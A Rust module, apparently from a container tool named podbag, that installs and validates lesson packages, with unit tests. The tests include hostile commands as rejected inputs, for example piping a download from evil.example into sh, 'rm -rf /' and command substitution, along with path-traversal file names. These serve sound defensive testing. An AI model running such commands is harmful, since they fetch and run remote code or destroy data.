//! Installed instructions and completion records for hands-on volume lessons. Lessons can include a small offline animation.
pub mod catalog;
pub mod containers;
pub mod course;
pub mod gui;
use serde::{Deserialize, Serialize};
use std::{
    collections::BTreeMap,
    fs,
    io::{self, Write},
    path::{Path, PathBuf},
};
use tempfile::NamedTempFile;

pub const SCOPE: &str = "PODBAG_VOLUME_LAB";
pub const FORMAT: &str = "podbag-cli-tui-volumes-v1";
pub const LIMIT: usize = 65_536;

/// A practice module: one of the three labs built into podbag, or a course module (data).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Module {
    Containers,
    Volumes,
    Tui,
    /// A `course::FORMAT` module, by its id.
    Course(String),
}

/// Course modules from before `course::FORMAT`: their steps were in podbag itself. A sync
/// replaces them with the catalog's file of the same id.
const OLD_COURSES: [(&str, &str); 5] = [
    ("podbag-web-basics-v1", "web-basics"),
    ("podbag-volume-persistence-v1", "volume-persistence"),
    ("podbag-web-service-lifecycle-v1", "web-service-lifecycle"),
    ("podbag-web-service-recovery-v1", "web-service-recovery"),
    ("podbag-container-network-v1", "container-network"),
];

/// The order of the Training list when no catalog was synced yet.
const DEFAULT_ORDER: [&str; 8] = [
    "container-basics",
    "web-basics",
    "volume-persistence",
    "web-service-lifecycle",
    "web-service-recovery",
    "container-network",
    "volume-basics",
    "tui-volumes",
];

/// Ids a course module cannot have: the built-in labs, the library's other files, and
/// names Windows keeps for devices.
fn reserved(id: &str) -> bool {
    let device = ["con", "nul", "aux", "prn"].contains(&id)
        || ["com", "lpt"].iter().any(|p| {
            id.strip_prefix(p)
                .is_some_and(|n| n.len() == 1 && n.as_bytes()[0].is_ascii_digit())
        });
    device
        || Module::LABS.iter().any(|lab| lab.id() == id)
        || ["catalog", "cli-tui-volumes", "modules"].contains(&id)
}

fn origin() -> &'static str {
    if cfg!(debug_assertions) {
        option_env!("PODBAG_TRAINING_PREVIEW_ORIGIN").unwrap_or("https://podbag.dev")
    } else {
        "https://podbag.dev"
    }
}

impl Module {
    pub const LABS: [Self; 3] = [Self::Containers, Self::Volumes, Self::Tui];

    pub fn id(&self) -> &str {
        match self {
            Self::Containers => "container-basics",
            Self::Volumes => "volume-basics",
            Self::Tui => "tui-volumes",
            Self::Course(id) => id,
        }
    }

    pub fn parse(id: &str) -> io::Result<Self> {
        if let Some(lab) = Self::LABS.into_iter().find(|m| m.id() == id) {
            return Ok(lab);
        }
        let valid = !reserved(id)
            && !id.is_empty()
            && id.len() <= 40
            && id
                .bytes()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'-');
        if valid {
            Ok(Self::Course(id.into()))
        } else {
            Err(io::Error::other(
                "Unknown practice module. Run podbag lab list.",
            ))
        }
    }

    /// The module a package belongs to.
    pub fn of(package: &Package) -> io::Result<Self> {
        let format = package.format.as_str();
        if course::is_course(format) {
            return Ok(Self::Course(package.id.clone().unwrap_or_default()));
        }
        if let Some((_, id)) = OLD_COURSES.iter().find(|(old, _)| *old == format) {
            return Ok(Self::Course((*id).into()));
        }
        match format {
            containers::FORMAT => Ok(Self::Containers),
            gui::FORMAT => Ok(Self::Volumes),
            FORMAT => Ok(Self::Tui),
            _ => Err(io::Error::other("Unsupported practice module.")),
        }
    }

    /// Whether podbag can install a module of FORMAT.
    pub fn known_format(format: &str) -> bool {
        [
            course::FORMAT,
            course::FORMAT_V2,
            containers::FORMAT,
            gui::FORMAT,
            FORMAT,
        ]
        .contains(&format)
            || OLD_COURSES.iter().any(|(old, _)| *old == format)
    }

    /// The web guide of a built-in lab. A course module has its own (`Installed::guide_url`).
    pub fn guide_url(&self, lang: &str) -> Option<String> {
        let lang = lang.split(['-', '_', '.']).next().unwrap_or("en");
        let (post, locale) = match self {
            Self::Containers | Self::Course(_) => {
                (self.id(), if lang == "ko" { "ko/" } else { "" })
            }
            Self::Volumes => (
                "cli-tui-volumes",
                match lang {
                    "ko" => "ko/",
                    "ja" => "ja/",
                    "zh" => "zh-CN/",
                    "es" => "es/",
                    "fil" => "fil/",
                    "vi" => "vi/",
                    _ => "",
                },
            ),
            Self::Tui => return None,
        };
        Some(format!("{}/{locale}blog/{post}/", origin()))
    }

    fn path(&self, dir: &Path) -> PathBuf {
        dir.join(format!("{}.json", self.id()))
    }
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Introduction {
    pub title: String,
    pub text: String,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Animation {
    pub mp4: String,
    pub webp: String,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Words {
    pub title: String,
    pub guide: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub intro: Option<Introduction>,
    /// The guide's page, for course modules.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Package {
    pub format: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub animation: Option<Animation>,
    pub translations: BTreeMap<String, Words>,
    /// Course modules (`course::FORMAT`, `course::FORMAT_V2`) only: their id, port, files
    /// and steps.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub port: Option<u16>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub steps: Vec<course::StepDef>,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub files: BTreeMap<String, String>,
}

impl Package {
    /// The steps of a course module.
    pub fn course(&self) -> Option<course::Course> {
        course::is_course(&self.format).then(|| course::Course {
            id: self.id.clone().unwrap_or_default(),
            port: self.port,
            steps: self.steps.clone(),
            files: self.files.clone(),
        })
    }
}

#[derive(Serialize, Deserialize)]
pub struct Installed {
    pub package: Package,
    pub completed: bool,
    generation: String,
    /// The catalog's SHA-256 of the file, for modules from a sync.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
}

pub fn directory() -> io::Result<PathBuf> {
    crate::client::ui_dir()
        .map(|p| p.join("tutorials"))
        .ok_or_else(|| io::Error::other("Cannot locate the tutorial library."))
}

fn read_file(path: &Path) -> io::Result<Option<Installed>> {
    match fs::read(path) {
        Ok(bytes) => {
            let record: Installed = serde_json::from_slice(&bytes)?;
            if !record.package.translations.contains_key("en") {
                return Err(io::Error::other(
                    "The installed lesson is missing its English guide.",
                ));
            }
            Ok(Some(record))
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(e),
    }
}

fn read_legacy(dir: &Path, module: &Module) -> io::Result<Option<Installed>> {
    if !matches!(module, Module::Volumes | Module::Tui) {
        return Ok(None);
    }
    Ok(read_file(&dir.join("cli-tui-volumes.json"))?
        .filter(|r| Module::of(&r.package).ok().as_ref() == Some(module)))
}

pub fn read(dir: &Path, module: &Module) -> io::Result<Option<Installed>> {
    let record = match read_file(&module.path(dir))? {
        Some(record) => Some(record),
        None => read_legacy(dir, module)?,
    };
    // A file whose content belongs to another module is not this module.
    Ok(record.filter(|r| Module::of(&r.package).ok().as_ref() == Some(module)))
}

/// The installed modules, in the synced catalog's order (see `catalog`).
pub fn list(dir: &Path) -> io::Result<Vec<Installed>> {
    let mut modules: Vec<Module> = Module::LABS.into();
    match fs::read_dir(dir) {
        Ok(entries) => {
            for entry in entries {
                let name = entry?.file_name();
                let Some(id) = name.to_str().and_then(|n| n.strip_suffix(".json")) else {
                    continue;
                };
                if let Ok(module @ Module::Course(_)) = Module::parse(id) {
                    modules.push(module);
                }
            }
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => {}
        Err(e) => return Err(e),
    }
    let order = catalog::order(dir);
    let rank = |m: &Module| {
        let id = m.id();
        order
            .iter()
            .position(|o| o == id)
            .or_else(|| {
                DEFAULT_ORDER
                    .iter()
                    .position(|o| *o == id)
                    .map(|p| p + 1000)
            })
            .unwrap_or(usize::MAX)
    };
    modules.sort_by(|a, b| rank(a).cmp(&rank(b)).then_with(|| a.id().cmp(b.id())));
    let mut items = Vec::new();
    for module in modules {
        if let Ok(Some(record)) = read(dir, &module) {
            items.push(record);
        }
    }
    Ok(items)
}

/// Whether `lab start ID` should sync the catalog first: the module is missing, or it is
/// an old course file without steps.
pub fn needs_sync(dir: &Path, id: &str) -> bool {
    let Ok(module) = Module::parse(id) else {
        return false;
    };
    match read(dir, &module) {
        Ok(None) => true,
        Ok(Some(record)) => matches!(module, Module::Course(_)) && record.course().is_err(),
        Err(_) => false,
    }
}

pub fn selected(dir: &Path, id: Option<&str>) -> io::Result<Module> {
    if let Some(id) = id {
        return Module::parse(id);
    }
    match list(dir)?.as_slice() {
        [] => Err(io::Error::other(
            "Install a module with podbag lab install FILE first.",
        )),
        [record] => Module::of(&record.package),
        _ => Err(io::Error::other("Choose a module ID from podbag lab list.")),
    }
}

fn locked(dir: &Path) -> io::Result<fs::File> {
    fs::create_dir_all(dir)?;
    let file = fs::OpenOptions::new()
        .create(true)
        .truncate(false)
        .read(true)
        .write(true)
        .open(dir.join("modules.lock"))?;
    file.lock()?;
    Ok(file)
}

fn write(dir: &Path, module: &Module, record: &Installed) -> io::Result<()> {
    let mut tmp = NamedTempFile::new_in(dir)?;
    serde_json::to_writer(tmp.as_file_mut(), record)?;
    tmp.flush()?;
    tmp.persist(module.path(dir))?;
    Ok(())
}

/// A module file, checked: a known format, an English text, and safe course steps.
pub fn parse_package(text: &str) -> io::Result<Package> {
    if text.len() > LIMIT {
        return Err(io::Error::other("The module is too large."));
    }
    let mut package: Package = serde_json::from_str(text)?;
    if course::is_course(&package.format) {
        course::drop_foreign_ui(&mut package);
        course::validate(&package)?;
    } else {
        Module::of(&package)?;
        if package.id.is_some()
            || package.port.is_some()
            || !package.steps.is_empty()
            || !package.files.is_empty()
        {
            return Err(io::Error::other("Only course modules have steps."));
        }
    }
    let valid_text =
        |s: &str| !s.trim().is_empty() && !s.chars().any(|c| c.is_control() && c != '\n');
    if !package.translations.contains_key("en")
        || package.animation.as_ref().is_some_and(|a| {
            package.translations["en"].intro.is_none()
                || [&a.mp4, &a.webp].into_iter().any(|s| {
                    s.is_empty()
                        || !s.len().is_multiple_of(4)
                        || !s
                            .bytes()
                            .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'='))
                })
        })
        || package.translations.values().any(|w| {
            !valid_text(&w.title)
                || !valid_text(&w.guide)
                || w.intro
                    .as_ref()
                    .is_some_and(|i| !valid_text(&i.title) || !valid_text(&i.text))
        })
    {
        return Err(io::Error::other("Invalid volume lesson."));
    }
    Ok(package)
}

pub fn install(dir: &Path, text: &str) -> io::Result<Module> {
    install_with(dir, parse_package(text)?, None)
}

/// Installs a checked PACKAGE; SHA256 is the catalog's hash of its file.
fn install_with(dir: &Path, package: Package, sha256: Option<String>) -> io::Result<Module> {
    let module = Module::of(&package)?;
    let _lock = locked(dir)?;
    let current = read(dir, &module).ok().flatten();
    // An old course file (from an old guide) does not replace the course's steps.
    if !course::is_course(&package.format)
        && current
            .as_ref()
            .is_some_and(|r| course::is_course(&r.package.format))
    {
        return Ok(module);
    }
    // An update keeps the generation, so a session that started before it can still
    // finish; a new install (also after a remove) gets a new one.
    let generation = match &current {
        Some(record) => record.generation.clone(),
        None => NamedTempFile::new_in(dir)?
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .into_owned(),
    };
    // The same module keeps its completion, also when a sync replaces an old format.
    let completed = current.is_some_and(|r| r.completed);
    write(
        dir,
        &module,
        &Installed {
            package,
            generation,
            completed,
            sha256,
        },
    )?;
    Ok(module)
}

pub fn remove(dir: &Path, module: &Module) -> io::Result<()> {
    let _lock = locked(dir)?;
    if read_legacy(dir, module)?.is_some() {
        fs::remove_file(dir.join("cli-tui-volumes.json"))?;
    }
    match fs::remove_file(module.path(dir)) {
        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(()),
        result => result,
    }
}

impl Installed {
    pub fn finish(&self, dir: &Path) -> io::Result<()> {
        let _lock = locked(dir)?;
        let module = Module::of(&self.package)?;
        if let Some(mut current) = read(dir, &module)?
            && current.generation == self.generation
            && !current.completed
        {
            current.completed = true;
            write(dir, &module, &current)?;
        }
        Ok(())
    }
    /// The steps of a course module; an old course format needs a sync first.
    pub fn course(&self) -> io::Result<course::Course> {
        match Module::of(&self.package)? {
            Module::Course(_) => self.package.course().ok_or_else(|| {
                io::Error::other(
                    "Run podbag lab list, or Refresh in Training, to update this module.",
                )
            }),
            _ => Err(io::Error::other("This module has no course steps.")),
        }
    }

    /// The web guide in LANG, or in English.
    pub fn guide_url(&self, lang: &str) -> Option<String> {
        let module = Module::of(&self.package).ok()?;
        if !course::is_course(&self.package.format) {
            return module.guide_url(lang);
        }
        let url = self
            .words(lang)
            .url
            .as_ref()
            .or(self.package.translations["en"].url.as_ref())?;
        Some(url.replacen("https://podbag.dev", origin(), 1))
    }

    pub fn words(&self, lang: &str) -> &Words {
        let translations = &self.package.translations;
        translations
            .get(lang)
            .or_else(|| translations.get(lang.split(['-', '_', '.']).next().unwrap_or("en")))
            .unwrap_or(&translations["en"])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn guide_links_use_published_languages() {
        let path = |module: Module, lang| {
            let url = module.guide_url(lang).unwrap();
            url.split_once("://")
                .unwrap()
                .1
                .split_once('/')
                .unwrap()
                .1
                .to_owned()
        };
        assert_eq!(
            path(Module::Containers, "ko_KR.UTF-8"),
            "ko/blog/container-basics/"
        );
        assert_eq!(path(Module::Containers, "ja"), "blog/container-basics/");
        assert_eq!(
            path(Module::Volumes, "zh-CN"),
            "zh-CN/blog/cli-tui-volumes/"
        );
        assert_eq!(path(Module::Volumes, "es_ES"), "es/blog/cli-tui-volumes/");
        assert!(Module::Tui.guide_url("en").is_none());
    }

    #[test]
    fn removing_and_reinstalling_cannot_restore_an_earlier_sessions_progress() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path();
        let package = r#"{"format":"podbag-cli-tui-volumes-v1","translations":{"en":{"title":"Volumes","guide":"Open a terminal."}}}"#;
        install(dir, package).unwrap();
        let previous = read(dir, &Module::Tui).unwrap().unwrap();
        remove(dir, &Module::Tui).unwrap();
        previous.finish(dir).unwrap();
        assert!(read(dir, &Module::Tui).unwrap().is_none());
        install(dir, package).unwrap();
        previous.finish(dir).unwrap();
        let current = read(dir, &Module::Tui).unwrap().unwrap();
        assert!(!current.completed);
        assert_eq!(current.words("ko").title, "Volumes");
        current.finish(dir).unwrap();
        assert!(read(dir, &Module::Tui).unwrap().unwrap().completed);
        install(dir, package).unwrap();
        assert!(read(dir, &Module::Tui).unwrap().unwrap().completed);
        install(dir, &package.replace(FORMAT, gui::FORMAT)).unwrap();
        install(dir, &package.replace(FORMAT, containers::FORMAT)).unwrap();
        assert_eq!(list(dir).unwrap().len(), 3);
        assert!(selected(dir, None).is_err());
        assert!(!read(dir, &Module::Volumes).unwrap().unwrap().completed);
        read(dir, &Module::Containers)
            .unwrap()
            .unwrap()
            .finish(dir)
            .unwrap();
        remove(dir, &Module::Containers).unwrap();
        assert!(read(dir, &Module::Tui).unwrap().unwrap().completed);
        assert!(!read(dir, &Module::Volumes).unwrap().unwrap().completed);
        assert!(install(dir, "{}").is_err());
    }

    const FIXTURES: [&str; 5] = [
        include_str!("../tests/fixtures/training/web-basics.podbag"),
        include_str!("../tests/fixtures/training/volume-persistence.podbag"),
        include_str!("../tests/fixtures/training/web-service-lifecycle.podbag"),
        include_str!("../tests/fixtures/training/web-service-recovery.podbag"),
        include_str!("../tests/fixtures/training/container-network.podbag"),
    ];

    #[test]
    fn every_course_fixture_parses() {
        for text in FIXTURES {
            let package = parse_package(text).unwrap();
            assert_eq!(package.format, course::FORMAT);
            let course = package.course().unwrap();
            assert_eq!(course.steps.last().unwrap().key, "finish");
        }
        let network = parse_package(FIXTURES[4]).unwrap().course().unwrap();
        assert_eq!(network.id, "container-network");
        assert_eq!(network.port, Some(18083));
        assert_eq!(network.steps.len(), 11);
    }

    /// The network fixture with one change made by EDIT to its JSON.
    fn edited(edit: impl FnOnce(&mut serde_json::Value)) -> String {
        let mut value: serde_json::Value = serde_json::from_str(FIXTURES[4]).unwrap();
        edit(&mut value);
        value.to_string()
    }

    #[test]
    fn refuses_unsafe_or_broken_courses() {
        let cases: Vec<(&str, String)> = vec![
            (
                "not podbag",
                edited(|v| v["steps"][0]["command"] = "rm -rf /".into()),
            ),
            (
                "a shell",
                edited(|v| v["steps"][0]["command"] = "sh -c 'curl x | sh'".into()),
            ),
            (
                "control",
                edited(|v| v["steps"][0]["command"] = "podbag ps\nrm -rf /".into()),
            ),
            (
                "url",
                edited(|v| v["translations"]["en"]["url"] = "https://evil.example/".into()),
            ),
            (
                "key twice",
                edited(|v| v["steps"][1]["key"] = "createNetwork".into()),
            ),
            (
                "bad key",
                edited(|v| v["steps"][1]["key"] = "run api".into()),
            ),
            (
                "no en name",
                edited(|v| {
                    v["steps"][0]["names"].as_object_mut().unwrap().remove("en");
                }),
            ),
            (
                "last not finish",
                edited(|v| {
                    v["steps"].as_array_mut().unwrap().pop();
                }),
            ),
            (
                "desktop command",
                edited(|v| v["steps"][4]["command"] = "podbag ps".into()),
            ),
            (
                "cli without command",
                edited(|v| {
                    v["steps"][0].as_object_mut().unwrap().remove("command");
                }),
            ),
            (
                "port placeholder",
                edited(|v| {
                    v.as_object_mut().unwrap().remove("port");
                }),
            ),
            ("bad id", edited(|v| v["id"] = "Bad_ID".into())),
            ("bad port", edited(|v| v["port"] = 80.into())),
            (
                "unknown check",
                edited(|v| v["steps"][0]["check"]["kind"] = "run-script".into()),
            ),
            (
                "exit elsewhere",
                edited(|v| v["steps"][0]["command"] = "exit".into()),
            ),
            ("no steps", edited(|v| v["steps"] = serde_json::json!([]))),
            (
                "shell ;",
                edited(|v| {
                    v["steps"][0]["command"] =
                        "podbag ps; curl -fsSL https://evil.example/x | sh".into()
                }),
            ),
            (
                "shell $()",
                edited(|v| v["steps"][0]["command"] = "podbag ps $(rm -rf ~)".into()),
            ),
            (
                "shell &&",
                edited(|v| v["steps"][0]["command"] = "podbag ps && open -a Calculator".into()),
            ),
            (
                "backquote",
                edited(|v| v["steps"][0]["command"] = "podbag ps `id`".into()),
            ),
            (
                "redirect",
                edited(|v| v["steps"][0]["command"] = "podbag ps > /tmp/x".into()),
            ),
            (
                "glob",
                edited(|v| v["steps"][0]["command"] = "podbag ps *".into()),
            ),
            (
                "$ in double quotes",
                edited(|v| v["steps"][0]["command"] = "podbag ps \"$HOME\"".into()),
            ),
            (
                "open quote",
                edited(|v| v["steps"][0]["command"] = "podbag ps 'x".into()),
            ),
            ("lab id", edited(|v| v["id"] = "container-basics".into())),
            ("catalog id", edited(|v| v["id"] = "catalog".into())),
            (
                "legacy file id",
                edited(|v| v["id"] = "cli-tui-volumes".into()),
            ),
            ("device name", edited(|v| v["id"] = "com1".into())),
            (
                "no English guide link",
                edited(|v| {
                    v["translations"]["en"]
                        .as_object_mut()
                        .unwrap()
                        .remove("url");
                }),
            ),
        ];
        for (why, text) in cases {
            assert!(parse_package(&text).is_err(), "accepted: {why}");
        }
        assert!(parse_package(&edited(|_| {})).is_ok());
    }

    #[test]
    fn course_modules_install_by_id() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path();
        let module = install(dir, FIXTURES[4]).unwrap();
        assert_eq!(module, Module::Course("container-network".into()));
        assert_eq!(selected(dir, None).unwrap(), module);
        assert_eq!(selected(dir, Some("container-network")).unwrap(), module);
        let ids: Vec<_> = list(dir)
            .unwrap()
            .iter()
            .map(|r| Module::of(&r.package).unwrap().id().to_owned())
            .collect();
        assert_eq!(ids, ["container-network"]);
        read(dir, &module).unwrap().unwrap().finish(dir).unwrap();
        install(dir, FIXTURES[4]).unwrap();
        let record = read(dir, &module).unwrap().unwrap();
        assert!(record.completed, "an update keeps the completion");
        assert_eq!(
            record.guide_url("ko_KR.UTF-8").as_deref(),
            Some("https://podbag.dev/ko/blog/container-network/")
        );
        assert_eq!(
            record.guide_url("ja").as_deref(),
            Some("https://podbag.dev/blog/container-network/")
        );
        assert_eq!(record.course().unwrap().steps.len(), 11);
    }

    #[test]
    fn old_course_formats_ask_for_a_refresh() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path();
        let old = r#"{"format":"podbag-web-basics-v1","translations":{"en":{"title":"Web","guide":"Start."}}}"#;
        let module = install(dir, old).unwrap();
        assert_eq!(module, Module::Course("web-basics".into()));
        let record = read(dir, &module).unwrap().unwrap();
        let refresh = record.course().unwrap_err().to_string();
        assert!(refresh.contains("podbag lab list"), "{refresh}");
        assert_eq!(
            record.guide_url("en").as_deref(),
            Some("https://podbag.dev/blog/web-basics/")
        );
        record.finish(dir).unwrap();
        install(dir, FIXTURES[0]).unwrap();
        let record = read(dir, &module).unwrap().unwrap();
        assert!(record.completed && record.course().is_ok());
    }

    #[test]
    fn an_update_during_a_session_keeps_the_completion() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path();
        let module = install(dir, FIXTURES[0]).unwrap();
        // `lab start` reads the record, then a sync updates the module during the session.
        let at_start = read(dir, &module).unwrap().unwrap();
        let changed = FIXTURES[0].replace("Open a web server", "Open a server");
        install(dir, &changed).unwrap();
        at_start.finish(dir).unwrap();
        assert!(read(dir, &module).unwrap().unwrap().completed);
    }

    #[test]
    fn an_old_file_does_not_replace_a_course() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path();
        let module = install(dir, FIXTURES[0]).unwrap();
        let old = r#"{"format":"podbag-web-basics-v1","translations":{"en":{"title":"Web","guide":"Start."}}}"#;
        assert_eq!(install(dir, old).unwrap(), module);
        assert!(read(dir, &module).unwrap().unwrap().course().is_ok());
    }

    #[test]
    fn missing_and_old_courses_need_a_sync() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path();
        assert!(needs_sync(dir, "web-basics"));
        let old = r#"{"format":"podbag-web-basics-v1","translations":{"en":{"title":"Web","guide":"Start."}}}"#;
        install(dir, old).unwrap();
        assert!(needs_sync(dir, "web-basics"));
        install(dir, FIXTURES[0]).unwrap();
        assert!(!needs_sync(dir, "web-basics"));
        assert!(
            needs_sync(dir, "tui-volumes"),
            "the catalog lists the built-in labs too"
        );
        assert!(!needs_sync(dir, "Not An Id"));
    }

    /// The network fixture as a v2 module with an image step, a docker step and a file.
    fn v2(edit: impl FnOnce(&mut serde_json::Value)) -> String {
        edited(|v| {
            v["format"] = course::FORMAT_V2.into();
            v["files"] = serde_json::json!({"Dockerfile": "FROM busybox:1.37.0\n"});
            let steps = v["steps"].as_array_mut().unwrap();
            steps.insert(
                0,
                serde_json::json!({
                "key": "pull", "names": {"en": "Pull the image"},
                "command": "podbag pull docker.io/library/busybox:1.37.0",
                "check": {"kind": "image-exists", "name": "docker.io/library/busybox:1.37.0"}}),
            );
            steps.insert(
                1,
                serde_json::json!({
                "key": "list", "names": {"en": "List with the Docker CLI"},
                "command": "docker ps -a",
                "check": {"kind": "output-contains", "text": "CONTAINER ID"}}),
            );
            steps.insert(
                2,
                serde_json::json!({
                "key": "restarted", "names": {"en": "Watch it restart"},
                "command": "podbag ps",
                "check": {"kind": "container-restarted", "name": "api", "count": 1}}),
            );
            edit(v);
        })
    }

    #[test]
    fn v2_adds_kinds_files_and_docker_steps() {
        let package = parse_package(&v2(|_| {})).unwrap();
        assert_eq!(
            Module::of(&package).unwrap(),
            Module::Course("container-network".into())
        );
        assert!(Module::known_format(course::FORMAT_V2));
        let course = package.course().unwrap();
        assert_eq!(course.files["Dockerfile"], "FROM busybox:1.37.0\n");
        assert_eq!(course.steps.len(), 14);
        for kind in [
            r#"{"kind":"image-absent","name":"x:1"}"#,
            r#"{"kind":"container-created","name":"a"}"#,
            r#"{"kind":"container-stopped","name":"a"}"#,
            r#"{"kind":"container-paused","name":"a"}"#,
            r#"{"kind":"container-healthy","name":"a"}"#,
            r#"{"kind":"container-in-network","name":"a","network":"n"}"#,
            r#"{"kind":"container-not-in-network","name":"a","network":"n"}"#,
            r#"{"kind":"volume-absent","name":"v"}"#,
            r#"{"kind":"file-exists","path":"out/app.tar"}"#,
        ] {
            let text = v2(|v| v["steps"][0]["check"] = serde_json::from_str(kind).unwrap());
            assert!(parse_package(&text).is_ok(), "{kind}");
        }
    }

    #[test]
    fn v2_refuses_unsafe_files_and_v1_refuses_v2_parts() {
        let big = "x".repeat(16 * 1024 + 1);
        let cases: Vec<(&str, String)> = vec![
            (
                "parent path",
                v2(|v| v["files"] = serde_json::json!({"../x": "a"})),
            ),
            (
                "absolute path",
                v2(|v| v["files"] = serde_json::json!({"/etc/x": "a"})),
            ),
            (
                "odd path",
                v2(|v| v["files"] = serde_json::json!({"a b": "a"})),
            ),
            (
                "too much text",
                v2(|v| v["files"] = serde_json::json!({"big": big})),
            ),
            (
                "too many files",
                v2(|v| {
                    v["files"] = (0..9)
                        .map(|n| (format!("f{n}"), serde_json::json!("a")))
                        .collect();
                }),
            ),
            (
                "file-exists outside",
                v2(|v| {
                    v["steps"][0]["check"] =
                        serde_json::json!({"kind": "file-exists", "path": "../x"});
                }),
            ),
            (
                "docker with a pipe",
                v2(|v| v["steps"][1]["command"] = "docker ps | sh".into()),
            ),
            (
                "file over the podbag link",
                v2(|v| v["files"] = serde_json::json!({"bin/podbag": "#!/bin/sh"})),
            ),
            (
                "file over the link, other case",
                v2(|v| v["files"] = serde_json::json!({"BIN/podbag": "x"})),
            ),
            (
                "file in the engine's run folder",
                v2(|v| v["files"] = serde_json::json!({"run/closing": "x"})),
            ),
            (
                "file in the image store",
                v2(|v| v["files"] = serde_json::json!({"data/x": "x"})),
            ),
            (
                "docker config",
                v2(|v| v["files"] = serde_json::json!({"docker/config.json": "{}"})),
            ),
            (
                "the VM disk",
                v2(|v| v["files"] = serde_json::json!({"disk.img": "x"})),
            ),
            (
                "the socket",
                v2(|v| v["files"] = serde_json::json!({"api.sock": "x"})),
            ),
            (
                "docker -H",
                v2(|v| {
                    v["steps"][1]["command"] = "docker -H unix:///var/run/docker.sock ps".into()
                }),
            ),
            (
                "docker --context",
                v2(|v| v["steps"][1]["command"] = "docker --context real ps".into()),
            ),
            (
                "docker --config",
                v2(|v| v["steps"][1]["command"] = "docker --config other ps".into()),
            ),
            (
                "docker context",
                v2(|v| v["steps"][1]["command"] = "docker context use real".into()),
            ),
            (
                "other program",
                v2(|v| v["steps"][1]["command"] = "kubectl get pods".into()),
            ),
            (
                "port in a check without a port",
                v2(|v| {
                    v.as_object_mut().unwrap().remove("port");
                    v["steps"][0]["check"] =
                        serde_json::json!({"kind": "image-exists", "name": "127.0.0.1:{port}/x:1"});
                    for step in v["steps"].as_array_mut().unwrap() {
                        if let Some(c) = step["command"].as_str() {
                            step["command"] = c.replace("{port}", "18083").into();
                        }
                    }
                }),
            ),
            (
                "port in a file without a port",
                v2(|v| {
                    v.as_object_mut().unwrap().remove("port");
                    v["files"] = serde_json::json!({"compose.yaml": "127.0.0.1:{port}:8080"});
                    for step in v["steps"].as_array_mut().unwrap() {
                        if let Some(c) = step["command"].as_str() {
                            step["command"] = c.replace("{port}", "18083").into();
                        }
                    }
                }),
            ),
            (
                "v1 docker",
                edited(|v| v["steps"][0]["command"] = "docker ps".into()),
            ),
            (
                "v1 files",
                edited(|v| v["files"] = serde_json::json!({"a": "b"})),
            ),
            (
                "v1 new kind",
                edited(|v| {
                    v["steps"][0]["check"] =
                        serde_json::json!({"kind": "image-exists", "name": "x:1"});
                }),
            ),
        ];
        for (why, text) in cases {
            assert!(parse_package(&text).is_err(), "accepted: {why}");
        }
    }

    #[test]
    fn docker_modules_stay_off_windows() {
        let docker = parse_package(&v2(|_| {})).unwrap();
        let plain = parse_package(FIXTURES[0]).unwrap();
        assert!(catalog::usable_here(&docker, false));
        assert!(
            !catalog::usable_here(&docker, true),
            "no Docker CLI in the Windows lab"
        );
        assert!(catalog::usable_here(&plain, true));
    }
}
